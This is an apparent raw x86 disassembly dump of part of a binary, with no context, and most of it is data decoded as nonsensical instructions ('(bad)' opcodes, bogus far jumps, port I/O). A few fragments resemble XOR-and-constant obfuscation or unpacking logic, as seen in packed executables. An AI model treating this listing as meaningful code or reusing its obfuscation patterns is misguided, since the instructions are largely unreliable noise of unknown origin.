  4051a9:	or     edx,DWORD PTR [edi+0x641402cb]
  4051af:	popa   
  4051b0:	dec    ebx
  4051b1:	mov    ah,0x31
  4051b3:	add    BYTE PTR [esi-0x5e1f43cd],dh
  4051b9:	retf   0x821d
  4051bc:	daa    
  4051bd:	xchg   esi,edi
  4051bf:	aad    0x9
  4051c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c2:	push   ebx
  4051c3:	xchg   esi,eax
  4051c4:	nop
  4051c5:	div    BYTE PTR [eax]
  4051c7:	jmp    0x24bf8f98
  4051cc:	imul   edx,DWORD PTR [ecx],0xfffffff0
  4051cf:	xchg   ebx,eax
  4051d0:	fcmovb st,st(1)
  4051d2:	adc    al,0x4d
  4051d4:	(bad)  
  4051d5:	call   0x8494:0xcd498e4e
  4051dc:	popf   
  4051dd:	fsub   DWORD PTR [edx]
  4051df:	not    DWORD PTR cs:[ecx+0x25]
  4051e3:	rcr    DWORD PTR [ebp+0x7412d3f8],1
  4051e9:	sbb    DWORD PTR [ecx-0x5ccd966f],ebp
  4051ef:	cwde   
  4051f0:	pop    es
  4051f1:	push   0x6a
  4051f3:	dec    ebp
  4051f4:	jne    0x405238
  4051f6:	bound  esp,QWORD PTR [edx+0x21]
  4051f9:	mov    edi,0x264c6757
  4051fe:	inc    ecx
  4051ff:	jg     0x4051c4
  405201:	(bad)  
  405202:	xor    eax,0xe58a3892
  405207:	mov    DWORD PTR [esi-0x29],esi
  40520a:	(bad)  
  40520b:	stc    
  40520c:	push   esi
  40520d:	jle    0x4051c0
  40520f:	mov    ah,0xa8
  405211:	add    cl,BYTE PTR [esi+0x71]
  405214:	int3   
  405215:	adc    DWORD PTR [ebp+0x16],eax
  405218:	adc    eax,0xfa65d9dd
  40521d:	xchg   esi,eax
  40521e:	test   ebp,0xa13b2fc9
  405224:	dec    ecx
  405225:	aas    
  405226:	(bad)  
  405227:	ret    
  405228:	mov    esp,0x21461191
  40522d:	pop    ebp
  40522e:	pop    edx
  40522f:	aaa    
  405230:	test   BYTE PTR [edi],bl
  405232:	in     al,0x93
  405234:	pop    ss
  405235:	jecxz  0x405218
  405237:	xchg   edx,eax
  405238:	in     eax,0x5d
  40523a:	and    dh,cl
  40523c:	adc    esi,0x87b59ca7
  405242:	fsub   DWORD PTR [edi-0x10bfb11a]
  405248:	push   esi
  405249:	sub    eax,0x29147bfb
  40524e:	push   ecx
  40524f:	dec    edi
  405250:	arpl   bp,di
  405252:	xchg   esi,eax
  405253:	in     eax,dx
  405254:	bound  esi,QWORD PTR [ebp+ebx*4+0x14]
  405258:	or     esp,esp
  40525a:	adc    ch,bh
  40525c:	(bad)  
  40525d:	fadd   st(7),st
  40525f:	pop    ss
  405260:	fcom   QWORD PTR [edx+0x3fde96cf]
  405266:	push   ds
  405267:	xchg   ebp,eax
  405268:	adc    DWORD PTR [ebx+ebx*4-0x5de5d2ba],edi
  40526f:	fwait
  405270:	mov    al,ds:0x6726322
  405275:	(bad)  [ebp-0x35]
  405278:	mov    dh,0xde
  40527a:	sub    dl,al
  40527c:	stc    
  40527d:	call   0x1174:0x97f46cf
  405284:	mov    edx,0x2da7e9de
  405289:	ja     0x405232
  40528b:	dec    DWORD PTR [ebp-0x56685f1f]
  405291:	aam    0xfb
  405293:	(bad)  
  405294:	jge    0x405226
  405296:	test   bl,dh
  405298:	add    edi,DWORD PTR [edx+0x1e]
  40529b:	lock outs dx,BYTE PTR ds:[esi]
  40529d:	adc    BYTE PTR ds:0x3b01fa43,bh
  4052a3:	js     0x40526c
  4052a5:	inc    ebx
  4052a6:	mov    bh,0x4e
  4052a8:	pop    eax
  4052a9:	cli    
  4052aa:	popa   
  4052ab:	cmp    eax,0xc3471bb5
  4052b0:	add    BYTE PTR [edx-0x55609ddf],bh
  4052b6:	out    0xd,eax
  4052b8:	sub    DWORD PTR [edi-0x3],edi
  4052bb:	scas   al,BYTE PTR es:[edi]
  4052bc:	jno    0x405245
  4052be:	adc    al,0x75
  4052c0:	lahf   
  4052c1:	sti    
  4052c2:	sub    ecx,ecx
  4052c4:	cmp    BYTE PTR [ebp+0x21],bl
  4052c7:	outs   dx,DWORD PTR ds:[esi]
  4052c8:	aas    
  4052c9:	adc    DWORD PTR [ecx+0x1408f08],0x6e
  4052d0:	xor    al,0xc5
  4052d2:	inc    ebp
  4052d3:	dec    edx
  4052d4:	cdq    
  4052d5:	mov    al,0x97
  4052d7:	xchg   esi,eax
  4052d8:	pop    eax
  4052d9:	sar    dh,0x38
  4052dc:	cli    
  4052dd:	pop    es
  4052de:	repnz or esp,DWORD PTR [eax-0x37506293]
  4052e5:	pop    ss
  4052e6:	ror    ah,cl
  4052e8:	xor    ebx,esi
  4052ea:	mov    dl,0xcc
  4052ec:	ror    BYTE PTR [edi+0x73],0x40
  4052f0:	(bad)  
  4052f1:	fsub   st,st(2)
  4052f3:	sub    al,0x7e
  4052f5:	(bad)  
  4052f7:	loope  0x405290
  4052f9:	add    eax,0xf5082eb4
  4052fe:	mov    cl,0xce
  405300:	xchg   ah,ch
  405302:	and    eax,0x50523876
  405307:	div    bh
  405309:	jmp    0xf788298c
  40530e:	lea    ecx,[ebp+0x46cd8f2f]
  405314:	stc    
  405315:	pushf  
  405316:	dec    esi
  405317:	push   ss
  405318:	(bad)  
  405319:	cdq    
  40531a:	fdiv   QWORD PTR [ebp-0x6cccd9e2]
  405320:	push   0x9c0ae2e3
  405325:	std    
  405326:	mov    WORD PTR [ecx-0x49eed618],gs
  40532c:	imul   DWORD PTR [edx+0x66ac91a0]
  405332:	jecxz  0x4052b4
  405334:	cdq    
  405335:	ds ss xchg ebx,eax
  405338:	pop    edx
  405339:	mov    ebp,0x7250dbf9
  40533e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40533f:	push   eax
  405340:	pop    esp
  405341:	out    dx,eax
  405342:	pusha  
  405343:	(bad)  
  405344:	sub    ch,BYTE PTR [esi]
  405346:	xchg   BYTE PTR [ecx],al
  405348:	lods   al,BYTE PTR ds:[esi]
  405349:	sub    DWORD PTR [ebp-0x79a5136d],0xffffffbd
  405350:	or     BYTE PTR [ebx-0x408256e6],0xf9
  405357:	adc    DWORD PTR [ebp-0x56],ebx
  40535a:	mov    WORD PTR [ecx+0x38489bdc],cs
  405360:	(bad)  
  405361:	sbb    DWORD PTR ds:0x6d342b1,edx
  405367:	add    al,0x0
  405369:	ror    BYTE PTR [edx-0x76],cl
  40536c:	stos   DWORD PTR es:[edi],eax
  40536d:	cdq    
  40536e:	lods   al,BYTE PTR ds:[esi]
  40536f:	pop    ds
  405370:	cwde   
  405371:	imul   esi,DWORD PTR [edi-0x56396a72],0x35cc6ff3
  40537b:	ret    
  40537c:	xlat   BYTE PTR ds:[ebx]
  40537d:	imul   edx,eax,0x3
  405380:	mov    ebp,DWORD PTR [edx-0x12]
  405383:	adc    ebx,DWORD PTR [edx]
  405385:	lock into 
  405387:	sar    DWORD PTR [esi],1
  405389:	lods   eax,DWORD PTR ds:[esi]
  40538a:	jg     0x405374
  40538c:	fstp   TBYTE PTR [edx-0x1f]
  40538f:	cmp    DWORD PTR ds:0x7a92b8c6,edx
  405395:	shr    ebp,0x78
  405398:	xchg   ecx,eax
  405399:	xor    DWORD PTR [edi-0x1c],0xffffff82
  40539d:	fwait
  40539e:	jne    0x405342
  4053a0:	mov    ds:0x8f50bebd,eax
  4053a5:	adc    ecx,ebp
  4053a7:	out    dx,al
  4053a8:	clc    
  4053a9:	dec    esi
  4053aa:	imul   cl
  4053ac:	fdiv   DWORD PTR [eax+0x8e2e551]
  4053b2:	or     BYTE PTR [ebx-0x178dee83],ch
  4053b8:	xlat   BYTE PTR ds:[ebx]
  4053b9:	fwait
  4053ba:	mov    ecx,0xbefb8069
  4053bf:	mov    WORD PTR [ebx+0x41],?
  4053c2:	in     eax,dx
  4053c3:	mov    bl,0x8b
  4053c5:	mov    ds:0x1c53f43d,al
  4053ca:	mov    dl,0x81
  4053cc:	aad    0xb9
  4053ce:	aas    
  4053cf:	iret   
  4053d0:	dec    BYTE PTR [ecx-0x7d]
  4053d3:	jns    0x405400
  4053d5:	mov    ah,BYTE PTR [edi-0x1a]
  4053d8:	(bad)  [esi]
  4053da:	gs out 0xc,eax
  4053dd:	cmp    DWORD PTR gs:[ebx-0x49],ebx
  4053e1:	sub    dh,cl
  4053e3:	(bad)  
  4053e4:	out    dx,eax
  4053e5:	mov    ch,0x73
  4053e7:	push   cs
  4053e8:	xchg   DWORD PTR [ecx-0x58273b8e],ebp
  4053ee:	inc    esp
  4053ef:	inc    BYTE PTR ds:0xa4473c1
  4053f5:	lock mov ah,0xee
  4053f8:	jb     0x405402
  4053fa:	nop
  4053fb:	sbb    al,bl
  4053fd:	mov    al,ss:0x4bee3609
  405403:	lods   al,BYTE PTR ds:[esi]
  405404:	jbe    0x4053a6
  405406:	lahf   
  405407:	mov    al,ds:0x4181fa7e
  40540c:	and    DWORD PTR [ebp-0x1ad2bbee],edi
  405412:	cmp    al,dl
  405414:	xchg   esi,eax
  405415:	std    
  405416:	popa   
  405417:	stos   DWORD PTR es:[edi],eax
  405418:	cmp    al,0x63
  40541a:	and    ch,BYTE PTR [edi-0x239f5e22]
  405420:	ret    0x6661
  405423:	enter  0x48b7,0x91
  405427:	mov    DWORD PTR [ebp+0x1a],ecx
  40542a:	pop    esp
  40542b:	xor    dh,BYTE PTR [edi-0x4d4a1aff]
  405431:	dec    esp
  405432:	push   edi
  405433:	mov    eax,0xe75e802d
  405438:	sar    DWORD PTR [ecx],0x56
  40543b:	(bad)  
  40543d:	jns    0x405416
  40543f:	(bad)  [ecx-0x7d30628e]
  405445:	sub    esp,DWORD PTR [edi]
  405447:	xor    BYTE PTR [ebp-0x78614f91],0xd6
  40544e:	out    0x39,eax
  405450:	dec    ecx
  405451:	ins    DWORD PTR es:[edi],dx
  405452:	js     0x40546d
  405454:	data16 xchg BYTE PTR [esi+0x14bb3ce0],bl
  40545b:	lods   eax,DWORD PTR ds:[esi]
  40545c:	lds    edx,FWORD PTR [eax+0x77]
  40545f:	or     dl,al
  405461:	in     al,0xe7
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x6c44fbb8]
  405484:	sbb    al,0xd1
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054ba
  40548f:	sbb    ecx,DWORD PTR [ecx-0x31]
  405492:	shr    BYTE PTR [edx],0x74
  405495:	mov    ds:0xda1f8f96,al
  40549a:	push   esp
  40549b:	fwait
  40549c:	je     0x4054ee
  40549e:	jae    0x405516
  4054a0:	add    esi,edx
  4054a2:	enter  0xd2aa,0x62
  4054a6:	mov    esp,0xb08d0618
  4054ab:	repz in eax,dx
  4054ad:	stos   BYTE PTR es:[edi],al
  4054ae:	mov    ebx,0xf425a7b
  4054b3:	ror    DWORD PTR [ebx-0x47],cl
  4054b6:	rcr    al,0x79
  4054b9:	fwait
  4054ba:	repz push ds
  4054bc:	or     WORD PTR [edx+0x1c],di
  4054c0:	int    0xca
  4054c2:	rol    DWORD PTR [ebx+0x1ec18aea],1
  4054c8:	shl    BYTE PTR [ebx],0xab
  4054cb:	jae    0x405539
  4054cd:	sbb    al,BYTE PTR [eax+0x47d5f714]
  4054d3:	imul   BYTE PTR [ebp+0x6588f4cd]
  4054d9:	(bad)  
  4054da:	fstp   DWORD PTR ds:0x39447cff
  4054e0:	shr    BYTE PTR [eax+0x3eb3f16f],1
  4054e6:	xor    BYTE PTR [ecx],cl
  4054e8:	(bad)  
  4054e9:	int    0x69
  4054eb:	adc    eax,0xa5f350be
  4054f0:	xor    al,cl
  4054f2:	push   0x3999c66c
  4054f7:	jbe    0x4054f8
  4054f9:	les    esi,FWORD PTR [esi]
  4054fb:	jg     0x4054c4
  4054fd:	lds    eax,FWORD PTR [eax]
  4054ff:	(bad)  
  405503:	nop
  405504:	mov    ds:0x2e217ca0,al
  405509:	loopne 0x405524
  40550b:	mov    ebp,0x620f6053
  405510:	xchg   esi,eax
  405511:	mov    ebp,DWORD PTR [esi+0x2212c47a]
  405517:	mov    al,ds:0xddffdc
  40551c:	shl    BYTE PTR [ebx],cl
  40551e:	add    esi,ecx
  405520:	(bad)  
  405521:	in     eax,dx
  405522:	jl     0x40556d
  405524:	retf   0xd0a6
  405527:	(bad)  
  405528:	imul   esi,DWORD PTR [edi],0x21
  40552b:	inc    ecx
  40552c:	and    ah,BYTE PTR [ebx]
  40552e:	mov    ebp,DWORD PTR [esi+0x1a765018]
  405534:	mov    DWORD PTR [eax-0x6f],edi
  405537:	inc    edi
  405538:	xlat   BYTE PTR ds:[ebx]
  40553a:	shl    DWORD PTR [ebx-0x47],1
  40553d:	lock or esi,DWORD PTR [edi+ebx*2+0x68]
  405542:	mov    ebp,0xa8b794fb
  405547:	test   BYTE PTR ds:0xf62579ec,0xe6
  40554e:	mov    bh,0xb3
  405550:	dec    esp
  405551:	xchg   edi,eax
  405552:	xor    DWORD PTR [ebx+0x14],edx
  405555:	fbld   TBYTE PTR [eax]
  405557:	push   eax
  405558:	mov    ecx,0x2bdc3562
  40555d:	hlt    
  40555e:	push   es
  40555f:	jmp    0x4ef3:0x717ecdc5
  405566:	add    eax,0xf3f9593e
  40556b:	test   al,0x17
  40556d:	loope  0x40550e
  40556f:	je     0x4055b9
  405571:	push   0x2ee4c3f0
  405576:	lock fs pop ds
  405579:	pop    ecx
  40557a:	jo     0x405570
  40557c:	mov    ah,0x13
  40557e:	out    dx,eax
  40557f:	pop    ecx
  405580:	sub    DWORD PTR [edi+0x4ae437ea],ebx
  405586:	inc    esp
  405587:	fidiv  WORD PTR [ecx+ecx*4+0x38]
  40558b:	and    dh,BYTE PTR [edx-0x41]
  40558e:	test   DWORD PTR [edx+0x5c28cccf],esi
  405594:	dec    edx
  405595:	cli    
  405596:	xchg   edi,eax
  405597:	ss push ebx
  405599:	sbb    cl,BYTE PTR [ebp-0x750d2546]
  40559f:	daa    
  4055a0:	fcom   QWORD PTR [ecx+0x90d423f]
  4055a6:	adc    eax,0xe6d0c0c0
  4055ab:	leave  
  4055ac:	sub    dh,BYTE PTR [esi]
  4055ae:	mov    dh,0x28
  4055b0:	scas   al,BYTE PTR es:[edi]
  4055b1:	daa    
  4055b2:	fiadd  WORD PTR [ebp+edi*4+0x7b8537c8]
  4055b9:	jb     0x405566
  4055bb:	add    al,0x1a
  4055bd:	out    0xda,eax
  4055bf:	cmp    DWORD PTR [edx-0x7e36128d],edi
  4055c5:	or     DWORD PTR [edi-0x1b],edx
  4055c8:	cmp    edi,DWORD PTR [ebx+0x673cfcff]
  4055ce:	xor    ch,ch
  4055d0:	iret   
  4055d1:	xlat   BYTE PTR ds:[ebx]
  4055d2:	or     dh,bh
  4055d4:	gs out dx,al
  4055d6:	in     al,dx
  4055d7:	dec    dx
  4055d9:	sbb    cl,BYTE PTR [esi]
  4055db:	xchg   dl,cl
  4055dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055de:	jge    0x405578
  4055e0:	outs   dx,BYTE PTR ds:[esi]
  4055e1:	mov    eax,eax
  4055e3:	fbstp  TBYTE PTR [edi]
  4055e5:	mov    DWORD PTR [ebx+ebp*2-0x5f],esp
  4055e9:	add    eax,0x443feef2
  4055ee:	mov    ah,0x23
  4055f0:	arpl   WORD PTR [esp+eax*8+0x68],di
  4055f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f5:	add    BYTE PTR [ebx+ecx*4],bh
  4055f8:	mov    bh,0xc3
  4055fa:	int    0xc6
  4055fc:	jne    0x40565f
  4055fe:	push   esp
  4055ff:	dec    eax
  405600:	and    al,0x99
  405602:	aam    0x15
  405604:	outs   dx,DWORD PTR ds:[esi]
  405605:	xor    DWORD PTR [ecx],esp
  405607:	aas    
  405608:	js     0x405633
  40560a:	or     DWORD PTR es:[esp+ebx*4-0x6],ecx
  40560f:	data16 and al,0x60
  405612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405613:	popf   
  405614:	imul   esi,DWORD PTR [edi-0xf],0x38c20210
  40561b:	sti    
  40561c:	mov    dh,0xe9
  40561e:	jp     0x4055a2
  405620:	mov    ebp,DWORD PTR [edi-0x7005c474]
  405626:	das    
  405627:	les    edx,FWORD PTR [eiz*2+0x1e094dd0]
  40562e:	in     eax,0x9b
  405630:	dec    esi
  405631:	outs   dx,DWORD PTR ds:[esi]
  405632:	fist   DWORD PTR [eax-0x4d]
  405635:	mov    bl,0x9c
  405637:	dec    edi
  405638:	rol    DWORD PTR [edx-0x66],0x43
  40563c:	rol    DWORD PTR [esi+0x278d2e13],1
  405642:	lds    esp,FWORD PTR [edx-0x128633d4]
  405648:	jecxz  0x405648
  40564a:	mov    BYTE PTR [ecx+ecx*8-0x7],dh
  40564e:	jecxz  0x4055ef
  405650:	(bad)  
  405651:	imul   ebx,DWORD PTR [ecx+ebx*2],0x965ad905
  405658:	sbb    BYTE PTR [ebx],al
  40565a:	jb     0x40562c
  40565c:	mov    ecx,DWORD PTR [eax+0x10b13b98]
  405662:	xchg   edx,eax
  405663:	and    bh,BYTE PTR [esi-0x1f0dac1d]
  405669:	icebp  
  40566a:	(bad)  
  40566b:	sbb    eax,0x5660d457
  405670:	loope  0x4056e9
  405672:	xor    eax,DWORD PTR [ebx]
  405674:	cmp    ebx,DWORD PTR [edx-0x3f1e4f78]
  40567a:	jecxz  0x4056cc
  40567c:	scas   eax,DWORD PTR es:[edi]
  40567d:	add    DWORD PTR [esi-0x30666a76],0xe
  405684:	(bad)
  405687:	(bad)  
  405689:	fsub   QWORD PTR [eax-0xf]
  40568c:	push   ebp
  40568d:	clc    
  40568e:	dec    esi
  40568f:	push   eax
  405690:	mov    esp,0x4e5cfc4f
  405695:	bound  edi,QWORD PTR [edi-0x71ab6feb]
  40569b:	gs sbb al,0x2c
  40569e:	dec    edx
  40569f:	xchg   ebp,eax
  4056a0:	inc    edi
  4056a1:	mov    ax,0xa1ae
  4056a5:	ja     0x4056c0
  4056a7:	sbb    eax,0x3d0e6af0
  4056ac:	xchg   ecx,eax
  4056ad:	clc    
  4056ae:	push   eax
  4056af:	aas    
  4056b0:	popa   
  4056b1:	in     al,dx
  4056b2:	sar    BYTE PTR [esi+esi*2],0x2b
  4056b6:	xchg   ebp,eax
  4056b7:	sub    DWORD PTR [ecx+0x389c20b4],ebx
  4056bd:	and    bl,cl
  4056bf:	loope  0x405733
  4056c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056c2:	jle    0x4056f8
  4056c4:	xor    al,0x8
  4056c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056c7:	retf   
  4056c8:	std    
  4056c9:	xor    ch,BYTE PTR [edx+0x5f]
  4056cc:	enter  0xeb8d,0x67
  4056d0:	jp     0x4056ca
  4056d2:	pop    edx
  4056d3:	jb     0x405746
  4056d5:	mov    cl,0xd4
  4056d7:	pop    esi
  4056d8:	jo     0x405694
  4056da:	shl    DWORD PTR [ebx+0x6b42f4f9],1
  4056e0:	mov    edi,0x79c371e4
  4056e5:	adc    dl,BYTE PTR [esp+eax*8]
  4056e8:	pop    ecx
  4056e9:	cmp    al,0xb8
  4056eb:	retf   0x6730
  4056ee:	push   esp
  4056ef:	or     esi,DWORD PTR ds:0xcfe549c6
  4056f5:	mov    ecx,0x4fcf8974
  4056fa:	enter  0x9309,0xb
  4056fe:	xchg   edi,eax
  4056ff:	rol    al,cl
  405701:	fmul   QWORD PTR [edx]
  405703:	mov    bl,0x6d
  405705:	test   ebx,edx
  405707:	retf   0x93c2
  40570a:	xchg   ecx,eax
  40570b:	add    BYTE PTR [eax],dl
  40570d:	sub    dh,BYTE PTR [eax+eax*8+0x578ebb49]
  405714:	sbb    al,BYTE PTR [ebx-0x59]
  405717:	mov    esi,0xf7fcd8cc
  40571c:	test   al,0x67
  40571e:	mov    esi,?
  405720:	pop    ebp
  405721:	push   ss
  405722:	lds    esp,FWORD PTR [eax+0x3353a4b6]
  405728:	jmp    0xa794:0xc21d218a
  40572f:	mov    ah,0x87
  405731:	into   
  405732:	jg     0x4056b5
  405734:	shl    DWORD PTR [eax-0x29ca8738],1
  40573a:	into   
  40573b:	xor    BYTE PTR [ebx+0x5b],bh
  40573e:	pop    esp
  40573f:	sub    edx,0xce8cb635
  405745:	js     0x4056c7
  405747:	sub    ecx,DWORD PTR [esp+ecx*4]
  40574a:	xor    edx,0x28
  40574d:	hlt    
  40574e:	push   0x58672048
  405753:	and    BYTE PTR [esi-0x6e3d3f0c],ch
  405759:	xchg   edi,eax
  40575a:	mov    ch,0x13
  40575c:	retf   0x85a5
  40575f:	test   al,0x18
  405761:	lds    edi,FWORD PTR [edi-0x6d19be85]
  405767:	pushf  
  405768:	ret    0xc5b1
  40576b:	leave  
  40576c:	jle    0x405724
  40576e:	into   
  40576f:	cld    
  405770:	mov    edi,0x3358cc3c
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43379b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4336a3,0x433683
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4336df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x4d
  4057f5:	inc    eax
  4057f6:	loopne 0x40585b
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	push   di
  405802:	mov    al,0x2a
  405804:	lods   al,BYTE PTR ds:[esi]
  405805:	dec    edi
  405806:	and    cl,bh
  405808:	dec    edi
  405809:	xor    ah,BYTE PTR [edi+0x29]
  40580c:	push   0xd44c767f
  405811:	inc    eax
  405812:	arpl   WORD PTR [ecx+0x7a],bx
  405815:	lods   al,BYTE PTR ds:[esi]
  405816:	call   0x9fee3406
  40581b:	(bad)  
  40581c:	into   
  40581d:	push   es
  40581e:	cmp    BYTE PTR [edi-0x7a],cl
  405821:	fisubr DWORD PTR [ebp-0x36d05c3b]
  405827:	sub    bh,dl
  405829:	xchg   esp,eax
  40582a:	cli    
  40582b:	sbb    eax,0xa03be182
  405830:	clc    
  405831:	repz mov dl,BYTE PTR [ecx]
  405834:	or     al,0x34
  405836:	jne    0x4058b6
  405838:	out    0xff,eax
  40583a:	addr16 cmp dx,bp
  40583e:	adc    cl,BYTE PTR [eax+0x4246214b]
  405844:	mov    bl,0x63
  405846:	xchg   edi,edx
  405848:	sbb    edx,0xffffffe4
  40584b:	repz mov esp,0x99932a8a
  405851:	jo     0x40588c
  405853:	inc    ebx
  405854:	test   DWORD PTR [edi],esp
  405856:	inc    ecx
  405857:	jl     0x405816
  405859:	adc    eax,0xf542339f
  40585e:	xchg   edx,eax
  40585f:	in     eax,dx
  405860:	stos   BYTE PTR es:[edi],al
  405861:	push   edx
  405862:	shl    DWORD PTR [eax-0x2034610],cl
  405868:	sub    BYTE PTR [ebx-0x2e],bl
  40586b:	sub    BYTE PTR ds:0x9d6623ac,dh
  405871:	and    al,0x4b
  405873:	mov    BYTE PTR ds:0x71065edb,al
  405879:	imul   ebx,edx,0x3b
  40587c:	sub    DWORD PTR [ecx+0x4e9b5d02],edi
  405882:	mov    esp,0xa3b42575
  405887:	push   cs
  405888:	sub    al,0xc4
  40588a:	daa    
  40588b:	sbb    esi,DWORD PTR ds:0x96176de1
  405891:	cwde   
  405892:	pop    es
  405893:	and    eax,0x1f52b633
  405898:	imul   BYTE PTR [eax-0x32]
  40589b:	adc    ch,BYTE PTR [esi+0x54c296c6]
  4058a1:	xor    al,0xd6
  4058a3:	in     eax,dx
  4058a4:	in     eax,dx
  4058a5:	cmp    BYTE PTR [edx+0x67],cl
  4058a8:	xor    BYTE PTR [esp+edi*4+0x3f],bl
  4058ac:	mov    ah,0x56
  4058ae:	sahf   
  4058af:	mov    edi,DWORD PTR [ebp+0x37]
  4058b2:	push   ecx
  4058b3:	stc    
  4058b4:	dec    ebp
  4058b5:	out    dx,al
  4058b6:	adc    al,0x54
  4058b8:	(bad)  
  4058b9:	jle    0x4058ba
  4058bb:	or     BYTE PTR ds:0x984d9cd8,ah
  4058c1:	mov    al,ds:0x87771d40
  4058c6:	pop    esi
  4058c7:	mov    ds:0xf36a157,eax
  4058cc:	ins    BYTE PTR es:[edi],dx
  4058cd:	cli    
  4058ce:	fnstenv [ecx-0x4a7d588e]
  4058d4:	sub    eax,ebp
  4058d6:	push   edi
  4058d7:	aad    0x90
  4058d9:	adc    dl,BYTE PTR [ebx+edx*8]
  4058dc:	push   ss
  4058dd:	ja     0x405934
  4058df:	mov    dl,0xbd
  4058e1:	and    bl,BYTE PTR [eax]
  4058e3:	out    0xcc,al
  4058e5:	daa    
  4058e6:	pop    edx
  4058e7:	ss loopne 0x405954
  4058ea:	add    eax,DWORD PTR [eax]
  4058ec:	cmp    BYTE PTR [ecx],0x53
  4058ef:	inc    ebp
  4058f0:	mov    ds:0x217f2c8,eax
  4058f5:	mov    eax,0x4f5e0293
  4058fa:	mov    ecx,0x222e7886
  4058ff:	add    esi,eax
  405901:	mov    dh,0x13
  405903:	daa    
  405904:	jnp    0x4058fe
  405906:	mov    edx,0x2409de10
  40590b:	jb     0x405930
  40590d:	mov    ah,0x99
  40590f:	jl     0x405937
  405911:	push   ecx
  405912:	cmp    ebx,ecx
  405914:	sub    cl,BYTE PTR [edi-0x31]
  405917:	enter  0xf460,0xbc
  40591b:	mov    esp,0xe06579ba
  405920:	jae    0x40598d
  405922:	in     al,0xb
  405924:	inc    ebx
  405925:	mov    ch,0x40
  405927:	cli    
  405928:	and    DWORD PTR [edi-0x6a9161cf],edi
  40592e:	xchg   ecx,eax
  40592f:	imul   esi,DWORD PTR [ecx+0x39076a98],0xd387dc59
  405939:	adc    ebp,edi
  40593b:	cwde   
  40593c:	lds    ecx,FWORD PTR ss:[ecx+0x1459d67c]
  405943:	push   ds
  405944:	xchg   edx,eax
  405945:	xchg   ecx,eax
  405946:	sub    bl,0x8e
  405949:	clc    
  40594a:	mov    ch,0x37
  40594c:	and    esp,ecx
  40594e:	pop    esp
  40594f:	inc    esp
  405950:	cmp    al,BYTE PTR [eax]
  405952:	sti    
  405953:	dec    edx
  405954:	push   ebp
  405955:	jg     0x4059b6
  405957:	and    DWORD PTR [ecx],ebp
  405959:	call   0x4a7c:0x86316bda
  405960:	xor    al,0x21
  405962:	cmp    al,BYTE PTR [ecx-0x3fdfc886]
  405968:	pop    ecx
  405969:	cmp    edx,DWORD PTR [edi+0x42239765]
  40596f:	fcomp  st(1)
  405971:	aam    0x8a
  405973:	scas   al,BYTE PTR es:[edi]
  405974:	mov    eax,ds:0x129f6424
  405979:	loopne 0x405920
  40597b:	test   ah,ch
  40597d:	push   edi
  40597e:	rdtsc  
  405980:	fsub   DWORD PTR [ebp+0x1b0b268f]
  405986:	ins    DWORD PTR es:[edi],dx
  405987:	dec    ebp
  405988:	cwde   
  405989:	jns    0x40595f
  40598b:	add    al,bl
  40598d:	sub    eax,0xcd1df4b1
  405992:	repnz or BYTE PTR [edx-0x6a],0x48
  405997:	xor    cl,BYTE PTR [edi]
  405999:	std    
  40599a:	sub    al,0x6a
  40599c:	push   0x5c
  40599e:	and    dl,BYTE PTR [ecx+edx*2]
  4059a1:	mov    ds,WORD PTR [eax]
  4059a3:	jge    0x4059db
  4059a5:	sbb    dl,bl
  4059a7:	aam    0x8d
  4059a9:	std    
  4059aa:	mov    ah,0x77
  4059ac:	sbb    BYTE PTR [ecx+0x3952681d],0xa3
  4059b3:	xchg   edx,eax
  4059b4:	lock inc esi
  4059b6:	add    ch,BYTE PTR ds:0xffb5d12d
  4059bc:	out    0x5c,al
  4059be:	dec    esi
  4059bf:	ds or  al,0xd7
  4059c2:	stos   DWORD PTR es:[edi],eax
  4059c3:	sub    al,0x3b
  4059c5:	add    dh,ch
